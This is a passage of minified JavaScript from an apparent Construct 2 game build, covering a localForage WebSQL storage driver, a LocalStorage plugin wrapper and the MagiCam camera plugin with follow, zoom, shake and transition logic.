n.serializer=t,i})},iterate:function(c,t){var e=this,i=new Promise(function(h,i){e.ready().then(function(){var a=e._dbInfo;a.db.transaction(function(t){t.executeSql("SELECT * FROM "+a.storeName,[],function(t,e){for(var i=e.rows,s=i.length,n=0;n<s;n++){var r=i.item(n),o=(o=r.value)&&a.serializer.deserialize(o);if(void 0!==(o=c(o,r.key,n+1)))return void h(o)}h()},function(t,e){i(e)})})}).catch(i)});return h(i,t),i},getItem:function(e,t){var r=this;"string"!=typeof e&&(s.console.warn(e+" used as a key, but it is not a string."),e=String(e));var i=new Promise(function(s,n){r.ready().then(function(){var i=r._dbInfo;i.db.transaction(function(t){t.executeSql("SELECT * FROM "+i.storeName+" WHERE key = ? LIMIT 1",[e],function(t,e){e=(e=e.rows.length?e.rows.item(0).value:null)&&i.serializer.deserialize(e);s(e)},function(t,e){n(e)})})}).catch(n)});return h(i,t),i},setItem:function(o,t,e){var a=this;"string"!=typeof o&&(s.console.warn(o+" used as a key, but it is not a string."),o=String(o));var i=new Promise(function(n,r){a.ready().then(function(){void 0===t&&(t=null);var i=t,s=a._dbInfo;s.serializer.serialize(t,function(e,t){t?r(t):s.db.transaction(function(t){t.executeSql("INSERT OR REPLACE INTO "+s.storeName+" (key, value) VALUES (?, ?)",[o,e],function(){n(i)},function(t,e){r(e)})},function(t){t.code===t.QUOTA_ERR&&r(t)})})}).catch(r)});return h(i,e),i},removeItem:function(n,t){var r=this;"string"!=typeof n&&(s.console.warn(n+" used as a key, but it is not a string."),n=String(n));var e=new Promise(function(i,s){r.ready().then(function(){var e=r._dbInfo;e.db.transaction(function(t){t.executeSql("DELETE FROM "+e.storeName+" WHERE key = ?",[n],function(){i()},function(t,e){s(e)})})}).catch(s)});return h(e,t),e},clear:function(t){var n=this,e=new Promise(function(i,s){n.ready().then(function(){var e=n._dbInfo;e.db.transaction(function(t){t.executeSql("DELETE FROM "+e.storeName,[],function(){i()},function(t,e){s(e)})})}).catch(s)});return h(e,t),e},length:function(t){var n=this,e=new Promise(function(i,s){n.ready().then(function(){var e=n._dbInfo;e.db.transaction(function(t){t.executeSql("SELECT COUNT(key) as c FROM "+e.storeName,[],function(t,e){e=e.rows.item(0).c;i(e)},function(t,e){s(e)})})}).catch(s)});return h(e,t),e},key:function(n,t){var r=this,e=new Promise(function(i,s){r.ready().then(function(){var e=r._dbInfo;e.db.transaction(function(t){t.executeSql("SELECT key FROM "+e.storeName+" WHERE id = ? LIMIT 1",[n+1],function(t,e){e=e.rows.length?e.rows.item(0).key:null;i(e)},function(t,e){s(e)})})}).catch(s)});return h(e,t),e},keys:function(t){var s=this,e=new Promise(function(n,i){s.ready().then(function(){var e=s._dbInfo;e.db.transaction(function(t){t.executeSql("SELECT key FROM "+e.storeName,[],function(t,e){for(var i=[],s=0;s<e.rows.length;s++)i.push(e.rows.item(s).key);n(i)},function(t,e){i(e)})})}).catch(i)});return h(e,t),e}}}(void 0!==window?window:self);e.default=i,t.exports=e.default}],i.c=n,i.p="",i(0);function i(t){if(n[t])return n[t].exports;var e=n[t]={exports:{},id:t,loaded:!1};return s[t].call(e.exports,e,e.exports,i),e.loaded=!0,e.exports}var s,n})}catch(e){localForageInitFailed=!0}function c3JSONtoC2JSON(t){try{t=JSON.parse(t)}catch(t){return""}var e='{""c2array"": true,""size"": [2,'+t.length+', 1],""data"":';data0="",data1="";for(var i=0;i<t.length;i++){var s=t[i];data0+="["+s[0]+"],",data1+='[""'+s[1]+'""],'}return data0=data0.substring(0,data0.length-1),data1=data1.substring(0,data1.length-1),e+="[["+data0+"],["+data1+"]]}"}cr.plugins_.LocalStorage=function(t){this.runtime=t},function(){var n="",r="",o=[],a="";function h(t){return t?"string"==typeof t?t:"string"==typeof t.message?t.message:"string"==typeof t.name?t.name:"string"==typeof t.data?t.data:"unknown error":"unknown error"}function c(t,e){a=e,t.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnError,t)}var l="",t=void 0!==window.is_scirra_arcade;function u(t){return!l||t.substr(0,l.length)===l}t&&(l="sa"+window.scirra_arcade_id+"_");var e=cr.plugins_.LocalStorage.prototype;e.Type=function(t){this.plugin=t,this.runtime=t.runtime},e.Type.prototype.onCreate=function(){},e.Instance=function(t){this.type=t,this.runtime=t.runtime};var i=e.Instance.prototype;function s(){}function p(){}function d(){}i.onCreate=function(){this.pendingSets=0,this.pendingGets=0},i.onDestroy=function(){},i.saveToJSON=function(){return{}},i.loadFromJSON=function(t){},s.prototype.OnItemSet=function(t){return n===t},s.prototype.OnAnyItemSet=function(){return!0},s.prototype.OnItemGet=function(t){return n===t},s.prototype.OnAnyItemGet=function(){return!0},s.prototype.OnItemRemoved=function(t){return n===t},s.prototype.OnAnyItemRemoved=function(){return!0},s.prototype.OnCleared=function(){return!0},s.prototype.OnAllKeyNamesLoaded=function(){return!0},s.prototype.OnError=function(){return!0},s.prototype.OnItemExists=function(t){return n===t},s.prototype.OnItemMissing=function(t){return n===t},s.prototype.CompareKey=function(t,e){return cr.do_cmp(n,t,e)},s.prototype.CompareValue=function(t,e){return cr.do_cmp(r,t,e)},s.prototype.IsProcessingSets=function(){return 0<this.pendingSets},s.prototype.IsProcessingGets=function(){return 0<this.pendingGets},s.prototype.OnAllSetsComplete=function(){return!0},s.prototype.OnAllGetsComplete=function(){return!0},e.cnds=new s,p.prototype.SetItem=function(i,t){var e,s;localForageInitFailed?c(this,"storage failed to initialise - may be disabled in browser settings"):(e=l+i,this.pendingSets++,s=this,localforage.setItem(e,t,function(t,e){s.pendingSets--,t?(a=h(t),s.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnError,s)):(n=i,r=e,s.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnAnyItemSet,s),s.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnItemSet,s),r=n=""),0===s.pendingSets&&s.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnAllSetsComplete,s)}))},p.prototype.GetItem=function(i){var t,s;localForageInitFailed?c(this,"storage failed to initialise - may be disabled in browser settings"):(t=l+i,this.pendingGets++,s=this,localforage.getItem(t,function(t,e){s.pendingGets--,t?(a=h(t),s.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnError,s)):(n=i,null==(r=e)&&(r=""),s.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnAnyItemGet,s),s.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnItemGet,s),r=n=""),0===s.pendingGets&&s.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnAllGetsComplete,s)}))},p.prototype.CheckItemExists=function(i){var t,s;localForageInitFailed?c(this,"storage failed to initialise - may be disabled in browser settings"):(t=l+i,s=this,localforage.getItem(t,function(t,e){t?(a=h(t),s.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnError,s)):(n=i,null===e?(r="",s.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnItemMissing,s)):(r=e,s.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnItemExists,s)),r=n="")}))},p.prototype.RemoveItem=function(e){var t,i;localForageInitFailed?c(this,"storage failed to initialise - may be disabled in browser settings"):(t=l+e,i=this,localforage.removeItem(t,function(t){t?(a=h(t),i.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnError,i)):(n=e,r="",i.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnAnyItemRemoved,i),i.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnItemRemoved,i),n="")}))},p.prototype.ClearStorage=function(){var e;localForageInitFailed?c(this,"storage failed to initialise - may be disabled in browser settings"):t||(e=this,localforage.clear(function(t){t?(a=h(t),e.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnError,e)):(r=n="",cr.clearArray(o),e.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnCleared,e))}))},p.prototype.GetAllKeyNames=function(){var r;localForageInitFailed?c(this,"storage failed to initialise - may be disabled in browser settings"):(r=this,localforage.keys(function(t,e){var i,s,n;if(t)a=h(t),r.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnError,r);else{for(cr.clearArray(o),i=0,s=e.length;i<s;++i)u(n=e[i])&&o.push((n=n,l?u(n)?n.substr(l.length):void 0:n));r.runtime.trigger(cr.plugins_.LocalStorage.prototype.cnds.OnAllKeyNamesLoaded,r)}}))},e.acts=new p,d.prototype.ItemValue=function(t){t.set_any(r)},d.prototype.Key=function(t){t.set_string(n)},d.prototype.KeyCount=function(t){t.set_int(o.length)},d.prototype.KeyAt=function(t,e){(e=Math.floor(e))<0||e>=o.length?t.set_string(""):t.set_string(o[e])},d.prototype.ErrorMessage=function(t){t.set_string(a)},e.exps=new d}(),cr.plugins_.MagiCam=function(t){this.runtime=t},function(){var T={};function d(t,e,i,s,n,r){this.type=t,this.duration=e,this.param1=i,this.param2=s,this.param3=n,this.param4=r,this.progress=0}function g(t,e,i,s,n){this.global=n,this.name=t,this.x=e,this.y=i,this.scale=s,this.following=!1,this.followedObjects=[],this.followedObjectUIDs=[],this.objectWeights=[],this.followedObjectIPs=[],this.followLag=1,this.zoomToContain=!1,this.zoomMarginH=0,this.zoomMarginV=0,this.zoomBoundU=-1,this.zoomBoundL=-1,this.transitions=[],this.moveTransFinished=!1,this.zoomTransFinished=!1,this.isShaking=!1,this.shakeX=0,this.shakeY=0,this.shakeZoom=0,this.shakeTimer=0,this.shakeStrength=0,this.shakeMaxDeviation=0,this.shakeMaxZoomDeviation=0,this.shakeLength=0,this.shakeBuildTime=0,this.shakeDropTime=0}T.lerp=function(t,e,i){return t+(e-t)*i},T.cubic=function(t,e,i,s,n){return this.lerp(this.lerp(this.lerp(t,e,n),this.lerp(e,i,n),n),this.lerp(this.lerp(e,i,n),this.lerp(i,s,n),n),n)},T.clamp=function(t,e,i){return t<e?e:i<t?i:t},g.prototype.GetName=function(){return this.name},g.prototype.GetX=function(){return this.x},g.prototype.SetX=function(t){this.x=t},g.prototype.GetY=function(){return this.y},g.prototype.SetY=function(t){this.y=t},g.prototype.GetShakeX=function(){return this.shakeX},g.prototype.GetShakeY=function(){return this.shakeY},g.prototype.SetFollowedObject=function(t){this.followedObject=t},g.prototype.ShakeCamera=function(t){var e,i,s;this.isShaking&&(this.shakeTimer+=t,this.shakeTimer<this.shakeLength?(e=0,e=this.shakeTimer<this.shakeBuildTime?T.lerp(0,this.shakeStrength,this.shakeTimer/this.shakeBuildTime):this.shakeStrength,this.shakeTimer>this.shakeDropTime&&(e=T.lerp(this.shakeStrength,0,(this.shakeTimer-this.shakeDropTime)/(this.shakeLength-this.shakeDropTime))),s=Math.floor(361*Math.random())/57.2958,i=T.lerp(0,Math.cos(s)*this.shakeMaxDeviation,e),t=T.lerp(0,Math.sin(s)*this.shakeMaxDeviation,e),s=T.lerp(0,Math.floor(201*Math.random()-100)/100*this.shakeMaxZoomDeviation,e),this.shakeX=T.lerp(this.shakeX,i,e),this.shakeY=T.lerp(this.shakeY,t,e),this.shakeZoom=T.lerp(this.shakeZoom,s,e)):(this.isShaking=!1,this.shakeX=0,this.shakeY=0,this.shakeZoom=0))},g.prototype.ProcessTransitions=function(t){var e;this.moveTransFinished=!1,this.zoomTransFinished=!1;for(var i=0;i<this.transitions.length;)(e=this.transitions[i]).progress=T.clamp(e.progress+1/e.duration*t,0,1),"MOVE"==e.type?(this.x=T.cubic(e.param3,e.param3,e.param1,e.param1,e.progress),this.y=T.cubic(e.param4,e.param4,e.param2,e.param2,e.progress)):"SCALE"==e.type&&(this.scale=T.cubic(e.param2,e.param2,e.param1,e.param1,e.progress)),1==e.progress?("MOVE"==e.type?this.moveTransFinished=!0:"SCALE"==e.type&&(this.zoomTransFinished=!0),this.transitions.splice(i,1)):i++},g.prototype.UpdateCameraTarget=function(t,e){for(var i=0;i<this.transitions.length;i++){var s=this.transitions[i];"MOVE"==s.type?(s.param1=e.GetX(),s.param2=e.GetY()):"SCALE"==s.type&&(s.param1=e.scale)}},g.prototype.ProcessFollowing=function(t,e,i,s){var n=this.followedObjects,r=this.followedObjectIPs;if(this.following&&0<n.length){var o=0,a=0,h=0;if(this.zoomToContain){for(var c=0,l=0,u=0,p=0,d=!1,g=!1,f=!1,m=!1,y=0;y<n.length;y++){var _=n[y];_.update_bbox(),d?c=Math.min(c,_.bbox.left):(c=_.bbox.left,d=!0),g?l=Math.max(l,_.bbox.right):(l=_.bbox.right,g=!0),f?u=Math.min(u,_.bbox.top):(u=_.bbox.top,f=!0),m?p=Math.max(p,_.bbox.bottom):(p=_.bbox.bottom,m=!0)}var v=(e-2*this.zoomMarginH)/(l-c),b=(i-2*this.zoomMarginV)/(p-u),o=T.lerp(c,l,.5),a=T.lerp(u,p,.5);this.x<e/2/v&&(o=e/(v=(e-this.zoomMarginH)/l)/2),this.x>s.width-e/2/v&&(v=(e-this.zoomMarginH)/(s.width-c),o=s.width-e/v/2),this.y<i/2/b&&(a=i/(b=(i-this.zoomMarginV)/p)/2),this.y>s.height-i/2/b&&(b=(i-this.zoomMarginV)/(s.height-u),a=s.height-i/b/2),h=Math.min(v,b),-1!=this.zoomBoundL&&h<this.zoomBoundL&&(h=this.zoomBoundL),-1!=this.zoomBoundU&&h>this.zoomBoundU&&(h=this.zoomBoundU)}else{for(var w=0,x=0,S=0,y=0;y<n.length;y++)w+=n[y].getImagePoint(r[y],!0)*this.objectWeights[y],x+=n[y].getImagePoint(r[y],!1)*this.objectWeights[y],S+=this.objectWeights[y];o=w/S,a=x/S}1==this.followLag?(this.x=o,this.y=a,this.zoomToContain&&(this.scale=h)):(t=4*this.followLag*t*Math.sqrt(1/t),this.x=T.lerp(this.x,o,t),this.y=T.lerp(this.y,a,t),this.zoomToContain&&(this.scale=T.lerp(this.scale,h,t)))}};var t=cr.plugins_.MagiCam.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t){this.type=t,this.runtime=t.runtime,this.localCameras=[],this.localCameraCount=0,this.localCameraCountOld=0,this.transCamera=null,this.transTarget=null,this.isSwitchingCameras=!1,this.globalCameras=[],this.activeCamera=null};var e=t.Instance.prototype;function i(){}function s(){}function n(){}e.onCreate=function(){this.runtime.tickMe(this),this.my_timescale=-1},e.saveToJSON=function(){null!=this.transCamera&&this.localCameras.push(this.transCamera);for(var t={lcc:this.localCameraCount,olcc:this.localCameraCountOld,alcc:this.localCameras.length,agcc:this.globalCameras.length,tcnn:null!=this.transCamera},e=0;e<this.localCameras.length;e++){t["lc"+e+"g"]=this.localCameras[e].global,t["lc"+e+"n"]=this.localCameras[e].name,t["lc"+e+"x"]=this.localCameras[e].x,t["lc"+e+"y"]=this.localCameras[e].y,t["lc"+e+"s"]=this.localCameras[e].scale,t["lc"+e+"f"]=this.localCameras[e].following,t["lc"+e+"foc"]=this.localCameras[e].followedObjects.length;for(var i=0;i<this.localCameras[e].followedObjects.length;i++)t["lc"+e+"fo"+i]=this.localCameras[e].followedObjects[i].uid;for(var s=0;s<this.localCameras[e].objectWeights.length;s++)t["lc"+e+"fow"+s]=this.localCameras[e].objectWeights[s];for(var n=0;n<this.localCameras[e].followedObjectIPs.length;n++)t["lc"+e+"foip"+n]=this.localCameras[e].followedObjectIPs[n];t["lc"+e+"fl"]=this.localCameras[e].followLag,t["lc"+e+"ztc"]=this.localCameras[e].zoomToContain,t["lc"+e+"zmh"]=this.localCameras[e].zoomMarginH,t["lc"+e+"zmv"]=this.localCameras[e].zoomMarginV,t["lc"+e+"zbu"]=this.localCameras[e].zoomBoundU,t["lc"+e+"zbl"]=this.localCameras[e].zoomBoundL,t["lc"+e+"tc"]=this.localCameras[e].transitions.length;for(var r=0;r<this.localCameras[e].transitions.length;r++)t["lc"+e+"t"+r+"tp"]=this.localCameras[e].transitions[r].type,t["lc"+e+"t"+r+"d"]=this.localCameras[e].transitions[r].duration,t["lc"+e+"t"+r+"p1"]=this.localCameras[e].transitions[r].param1,t["lc"+e+"t"+r+"p2"]=this.localCameras[e].transitions[r].param2,t["lc"+e+"t"+r+"p3"]=this.localCameras[e].transitions[r].param3,t["lc"+e+"t"+r+"p4"]=this.localCameras[e].transitions[r].param4,t["lc"+e+"t"+r+"pr"]=this.localCameras[e].transitions[r].progress;t["lc"+e+"mtf"]=this.localCameras[e].moveTransFinished,t["lc"+e+"ztf"]=this.localCameras[e].zoomTransFinished,t["lc"+e+"csis"]=this.localCameras[e].isShaking,t["lc"+e+"cssx"]=this.localCameras[e].shakeX,t["lc"+e+"cssy"]=this.localCameras[e].shakeY,t["lc"+e+"cssz"]=this.localCameras[e].shakeZoom,t["lc"+e+"csst"]=this.localCameras[e].shakeTimer,t["lc"+e+"csss"]=this.localCameras[e].shakeStrength,t["lc"+e+"cssmd"]=this.localCameras[e].shakeMaxDeviation,t["lc"+e+"cssmzd"]=this.localCameras[e].shakeMaxZoomDeviation,t["lc"+e+"cssl"]=this.localCameras[e].shakeLength,t["lc"+e+"cssbt"]=this.localCameras[e].shakeBuildTime,t["lc"+e+"cssdt"]=this.localCameras[e].shakeDropTime}for(e=0;e<this.globalCameras.length;e++){t["gc"+e+"g"]=this.globalCameras[e].global,t["gc"+e+"n"]=this.globalCameras[e].name,t["gc"+e+"x"]=this.globalCameras[e].x,t["gc"+e+"y"]=this.globalCameras[e].y,t["gc"+e+"s"]=this.globalCameras[e].scale,t["gc"+e+"f"]=this.globalCameras[e].following,t["gc"+e+"foc"]=this.globalCameras[e].followedObjects.length;for(i=0;i<this.globalCameras[e].followedObjects.length;i++)t["gc"+e+"fo"+i]=this.globalCameras[e].followedObjects[i].uid;for(s=0;s<this.globalCameras[e].objectWeights.length;s++)t["gc"+e+"fow"+s]=this.globalCameras[e].objectWeights[s];for(n=0;n<this.globalCameras[e].followedObjectIPs.length;n++)t["gc"+e+"foip"+n]=this.globalCameras[e].followedObjectIPs[n];t["gc"+e+"fl"]=this.globalCameras[e].followLag,t["gc"+e+"ztc"]=this.globalCameras[e].zoomToContain,t["gc"+e+"zmh"]=this.globalCameras[e].zoomMarginH,t["gc"+e+"zmv"]=this.globalCameras[e].zoomMarginV,t["gc"+e+"zbu"]=this.globalCameras[e].zoomBoundU,t["gc"+e+"zbl"]=this.globalCameras[e].zoomBoundL,t["gc"+e+"tc"]=this.globalCameras[e].transitions.length;for(r=0;r<this.globalCameras[e].transitions.length;r++)t["gc"+e+"t"+r+"tp"]=this.globalCameras[e].transitions[r].type,t["gc"+e+"t"+r+"d"]=this.globalCameras[e].transitions[r].duration,t["gc"+e+"t"+r+"p1"]=this.globalCameras[e].transitions[r].param1,t["gc"+e+"t"+r+"p2"]=this.globalCameras[e].transitions[r].param2,t["gc"+e+"t"+r+"p3"]=this.globalCameras[e].transitions[r].param3,t["gc"+e+"t"+r+"p4"]=this.globalCameras[e].transitions[r].param4;t["gc"+e+"mtf"]=this.globalCameras[e].moveTransFinished,t["gc"+e+"ztf"]=this.globalCameras[e].zoomTransFinished,t["gc"+e+"csis"]=this.globalCameras[e].isShaking,t["gc"+e+"cssx"]=this.globalCameras[e].shakeX,t["gc"+e+"cssy"]=this.globalCameras[e].shakeY,t["gc"+e+"cssz"]=this.globalCameras[e].shakeZoom,t["gc"+e+"csst"]=this.globalCameras[e].shakeTimer,t["gc"+e+"csss"]=this.globalCameras[e].shakeStrength,t["gc"+e+"cssmd"]=this.globalCameras[e].shakeMaxDeviation,t["gc"+e+"cssmzd"]=this.globalCameras[e].shakeMaxZoomDeviation,t["gc"+e+"cssl"]=this.globalCameras[e].shakeLength,t["gc"+e+"cssbt"]=this.globalCameras[e].shakeBuildTime,t["gc"+e+"cssdt"]=this.globalCameras[e].shakeDropTime}return null!=this.activeCamera?t.ac=this.activeCamera.name:t.ac="null",null!=this.transTarget&&(t.tt=this.transTarget.name),t},e.loadFromJSON=function(t){this.localCameras=[],this.globalCameras=[],this.localCameraCount=t.lcc,this.localCameraCountOld=t.olcc;for(var e=t.alcc,i=0;i<e;i++){(c=new g("",0,0,0,!1)).global=t["lc"+i+"g"],c.name=t["lc"+i+"n"],c.x=t["lc"+i+"x"],c.y=t["lc"+i+"y"],c.scale=t["lc"+i+"s"],c.following=t["lc"+i+"f"];for(var s=t["lc"+i+"foc"],n=0;n<s;n++)c.followedObjectUIDs.push(t["lc"+i+"fo"+n]);for(var r=0;r<s;r++)c.objectWeights.push(t["lc"+i+"fow"+r]);for(var o=0;o<s;o++)c.followedObjectIPs.push(t["lc"+i+"foip"+o]);c.followLag=t["lc"+i+"fl"],c.zoomToContain=t["lc"+i+"ztc"],c.zoomMarginH=t["lc"+i+"zmh"],c.zoomMarginV=t["lc"+i+"zmv"],c.zoomBoundU=t["lc"+i+"zbu"],c.zoomBoundL=t["lc"+i+"zbl"];for(var a=t["lc"+i+"tc"],h=0;h<a;h++)(u=new d("",0,0,0,0)).type=t["lc"+i+"t"+h+"tp"],u.duration=t["lc"+i+"t"+h+"d"],u.param1=t["lc"+i+"t"+h+"p1"],u.param2=t["lc"+i+"t"+h+"p2"],u.param3=t["lc"+i+"t"+h+"p3"],u.param4=t["lc"+i+"t"+h+"p4"],u.progress=t["lc"+i+"t"+h+"pr"],c.transitions.push(u);c.moveTransFinished=t["lc"+i+"mtf"],c.zoomTransFinished=t["lc"+i+"ztf"],c.isShaking=t["lc"+i+"csis"],c.shakeX=t["lc"+i+"cssx"],c.shakeY=t["lc"+i+"cssy"],c.shakeZoom=t["lc"+i+"cssz"],c.shakeTimer=t["lc"+i+"csst"],c.shakeStrength=t["lc"+i+"csss"],c.shakeMaxDeviation=t["lc"+i+"cssmd"],c.shakeMaxZoomDeviation=t["lc"+i+"cssmzd"],c.shakeLength=t["lc"+i+"cssl"],c.shakeBuildTime=t["lc"+i+"cssbt"],c.shakeDropTime=t["lc"+i+"cssdt"],this.localCameras.push(c)}for(var c,l=t.agcc,i=0;i<l;i++){(c=new g("",0,0,0,!1)).global=t["gc"+i+"g"],c.name=t["gc"+i+"n"],c.x=t["gc"+i+"x"],c.y=t["gc"+i+"y"],c.scale=t["gc"+i+"s"],c.following=t["gc"+i+"f"];for(s=t["gc"+i+"foc"],n=0;n<s;n++)c.followedObjectUIDs.push(t["gc"+i+"fo"+n]);for(r=0;r<s;r++)c.objectWeights.push(t["gc"+i+"fow"+r]);for(o=0;o<s;o++)c.followedObjectIPs.push(t["gc"+i+"foip"+o]);c.followLag=t["gc"+i+"fl"],c.zoomToContain=t["gc"+i+"ztc"],c.zoomMarginH=t["gc"+i+"zmh"],c.zoomMarginV=t["gc"+i+"zmv"],c.zoomBoundU=t["gc"+i+"zbu"],c.zoomBoundL=t["gc"+i+"zbl"];for(var u,a=t["gc"+i+"tc"],h=0;h<a;h++)(u=new d("",0,0,0,0)).type=t["gc"+i+"t"+h+"tp"],u.duration=t["gc"+i+"t"+h+"d"],u.param1=t["gc"+i+"t"+h+"p1"],u.param2=t["gc"+i+"t"+h+"p2"],u.param3=t["gc"+i+"t"+h+"p3"],u.param4=t["gc"+i+"t"+h+"p4"],c.transitions.push(u);c.moveTransFinished=t["gc"+i+"mtf"],c.zoomTransFinished=t["gc"+i+"ztf"],c.isShaking=t["gc"+i+"csis"],c.shakeX=t["gc"+i+"cssx"],c.shakeY=t["gc"+i+"cssy"],c.shakeZoom=t["gc"+i+"cssz"],c.shakeTimer=t["gc"+i+"csst"],c.shakeStrength=t["gc"+i+"csss"],c.shakeMaxDeviation=t["gc"+i+"cssmd"],c.shakeMaxZoomDeviation=t["gc"+i+"cssmzd"],c.shakeLength=t["gc"+i+"cssl"],c.shakeBuildTime=t["gc"+i+"cssbt"],c.shakeDropTime=t["gc"+i+"cssdt"],this.globalCameras.push(c)}var p=t.ac;this.activeCamera="null"==p?null:this.GetCamera(p),t.tcnn&&(this.transCamera=this.localCameras.pop(),this.transTarget=this.GetCamera(t.tt))},e.afterLoad=function(){for(var t=0;t<this.localCameras.length;t++)for(var e=0;e<this.localCameras[t].followedObjectUIDs.length;e++)this.localCameras[t].followedObjects.push(this.runtime.getObjectByUID(this.localCameras[t].followedObjectUIDs[e]));for(t=0;t<this.globalCameras.length;t++)for(e=0;e<this.globalCameras[t].followedObjectUIDs.length;e++)this.globalCameras[t].followedObjects.push(this.runtime.getObjectByUID(this.globalCameras[t].followedObjectUIDs[e]))},e.onLayoutChange=function(){for(var t=0;t<this.localCameraCountOld;t++)this.localCameras.shift();this.localCameraCount-=this.localCameraCountOld},e.tick=function(){this.localCameraCountOld=this.localCameraCount;var t=this.runtime.getDt(this);0==t&&(t=.1);for(var e=0;e<this.globalCameras.length;e++)this.globalCameras[e].ProcessTransitions(t),this.globalCameras[e].ProcessFollowing(t,this.runtime.original_width,this.runtime.original_height,this.runtime.running_layout),this.globalCameras[e].ShakeCamera(t);for(e=0;e<this.localCameras.length;e++)this.localCameras[e].ProcessTransitions(t),this.localCameras[e].ProcessFollowing(t,this.runtime.original_width,this.runtime.original_height,this.runtime.running_layout),this.localCameras[e].ShakeCamera(t);null!=this.transCamera&&(this.transCamera.UpdateCameraTarget(t,this.transTarget),this.transCamera.ProcessTransitions(t),this.transCamera.moveTransFinished&&(this.activeCamera=this.transTarget,this.transCamera=null)),null!=this.activeCamera&&(this.runtime.running_layout.scrollToX(this.activeCamera.GetX()+this.activeCamera.GetShakeX()),this.runtime.running_layout.scrollToY(this.activeCamera.GetY()+this.activeCamera.GetShakeY()),this.runtime.running_layout.scale=this.activeCamera.scale+this.activeCamera.shakeZoom,this.runtime.redraw=!0)},e.draw=function(t){},e.drawGL=function(t){},e.GetCamera=function(t){if(""==t)return this.activeCamera;for(var e=this.globalCameras.length-1;0<=e;e--)if(this.globalCameras[e].GetName()==t)return this.globalCameras[e];for(e=this.localCameras.length-1;0<=e;e--)if(this.localCameras[e].GetName()==t)return this.localCameras[e];return null},i.prototype.TransitionFinished=function(t,e){t=this.GetCamera(t);if(null!=t){if(0==e)return t.moveTransFinished;if(1==e)return t.zoomTransFinished}return!1},i.prototype.TransitionIsInProgress=function(t,e){var i=this.GetCamera(t);if(null!=i)for(var s=0;s<i.transitions.length;s++){if("MOVE"==i.transitions[s].type&&0==e)return!0;if("SCALE"==i.transitions[s].type&&1==e)return!0}return!1},t.cnds=new i,s.prototype.FollowObject=function(t,e,i,s){var n;!e||null!=(n=this.GetCamera(t))&&(t=e.getFirstPicked(),!n.global||e.global?(n.followedObjects.push(t),n.objectWeights.push(i),n.followedObjectIPs.push(s)):alert("MagiCam:\n\nObject not global - global cameras must follow global objects."))},s.prototype.SetFollowLag=function(t,e){t=this.GetCamera(t);null!=t&&(t.followLag=1-e/100)},s.prototype.ZoomToContain=function(t,e,i,s,n,r){t=this.GetCamera(t);null!=t&&(0==e?(t.zoomToContain=!0,t.zoomMarginH=i,t.zoomMarginV=s,t.zoomBoundU=n,t.zoomBoundL=r):t.zoomToContain=!1)},s.prototype.EnableFollowing=function(t,e){t=this.GetCamera(t);null!=t&&(t.following=0==e)},s.prototype.UnfollowObject=function(t,e){if(e){var i=this.GetCamera(t);if(null!=i)for(var s=e.getFirstPicked(),n=0;n<i.followedObjects.length;n++)if(i.followedObjects[n]==s){i.followedObjects.splice(n,1);break}}},s.prototype.CreateLocalCamera=function(t,e,i,s,n){""!=t?(this.localCameras.push(new g(t,e,i,s,!1)),this.localCameraCount++,1==n&&(this.activeCamera=this.localCameras[this.localCameras.length-1],this.runtime.running_layout.scale=this.activeCamera.scale)):alert("Camera name must not be blank.")},s.prototype.CreateGlobalCamera=function(t,e,i,s,n){""!=t?null==this.GetCamera(t)&&(this.globalCameras.push(new g(t,e,i,s,!0)),1==n&&(this.activeCamera=this.globalCameras[this.globalCameras.length-1],this.runtime.running_layout.scrollToX(this.activeCamera.GetX()),this.runtime.running_layout.scrollToY(this.activeCamera.GetY()),this.runtime.running_layout.scale=this.activeCamera.scale)):alert("Camera name must not be blank.")},s.prototype.SetActiveCamera=function(t){t=this.GetCamera(t);null!=t&&(this.activeCamera=t,this.runtime.running_layout.scrollToX(t.GetX()),this.runtime.running_layout.scrollToY(t.GetY()),this.runtime.running_layout.scale=t.scale)},s.prototype.SetScrollSmoothing=function(t){},s.prototype.SetXPosition=function(t,e){t=this.GetCamera(t);null!=t&&t.SetX(e)},s.prototype.SetYPosition=function(t,e){t=this.GetCamera(t);null!=t&&t.SetY(e)},s.prototype.SetPosition=function(t,e,i){t=this.GetCamera(t);null!=t&&(t.SetX(e),t.SetY(i))},s.prototype.SetZoom=function(t,e){t=this.GetCamera(t);null!=t&&(t.scale=e)},s.prototype.TransitionToPoint=function(t,e,i,s){var n=this.GetCamera(t);if(null!=n){for(var r=0;r<n.transitions.length;r++)if("MOVE"==n.transitions[r].type){n.transitions.splice(r,1);break}n.transitions.push(new d("MOVE",s,e,i,n.GetX(),n.GetY())),n.following=!1,n.zoomToContain=!1}},s.prototype.TransitionToZoom=function(t,e,i){var s=this.GetCamera(t);if(null!=s){for(var n=0;n<s.transitions.length;n++)if("SCALE"==s.transitions[n].type){s.transitions.splice(n,1);break}s.transitions.push(new d("SCALE",i,e,s.scale,null,null)),s.zoomToContain=!1}},s.prototype.TransitionToCamera=function(t,e){t=this.GetCamera(t);null!=t&&(this.transTarget=t,this.transCamera=new g("transCamera",this.activeCamera.GetX(),this.activeCamera.GetY(),this.activeCamera.scale,!1),this.transCamera.transitions.push(new d("MOVE",e,this.transTarget.GetX(),this.transTarget.GetY(),this.transCamera.GetX(),this.transCamera.GetY())),this.transCamera.transitions.push(new 